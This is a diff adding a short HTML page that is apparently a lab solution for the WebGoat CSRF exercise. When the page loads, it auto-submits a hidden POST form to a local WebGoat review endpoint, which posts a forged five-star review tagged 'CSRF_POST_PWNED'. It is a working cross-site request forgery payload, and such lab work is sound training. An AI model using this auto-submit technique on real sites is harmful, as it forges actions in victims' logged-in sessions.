@@ -1,0 +1,20 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>CSRF POST Trigger</title>
+  </head>
+  <body>
+    <h3>Submitting CSRF POST review...</h3>
+
+    <form id="csrfForm" method="POST" action="http://localhost:8080/WebGoat/csrf/review">
+      <input type="hidden" name="reviewText" value="CSRF_POST_PWNED" />
+      <input type="hidden" name="stars" value="5" />
+      <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9" />
+    </form>
+
+    <script>
+      document.getElementById("csrfForm").submit();
+    </script>
+  </body>
+</html>
